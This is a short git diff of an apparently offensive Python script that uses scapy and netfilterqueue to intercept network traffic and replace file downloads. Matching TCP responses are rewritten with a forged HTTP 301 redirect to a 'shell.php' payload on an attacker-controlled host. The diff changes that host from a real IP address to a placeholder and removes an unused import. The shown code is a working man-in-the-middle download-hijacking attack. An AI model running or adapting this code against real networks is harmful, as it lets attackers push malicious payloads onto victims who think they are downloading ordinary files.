@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 import argparse
 import scapy.all as scapy
-from scapy.layers import http
 import netfilterqueue
 
 
@@ -43,7 +42,7 @@ def process_packet(packet):
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+] Replacing file..")
-                http_redirect = "HTTP/1.1 301 Moved Permanently\nLocation: http://10.222.111.228/evil_shit/shell.php\n\n"
+                http_redirect = "HTTP/1.1 301 Moved Permanently\nLocation: http://X.X.X.X/evil_shit/shell.php\n\n"
                 modified_packet = set_load(scapy_packet, http_redirect)
                 packet.set_payload(str(modified_packet))
     packet.accept()  # Forwards packets
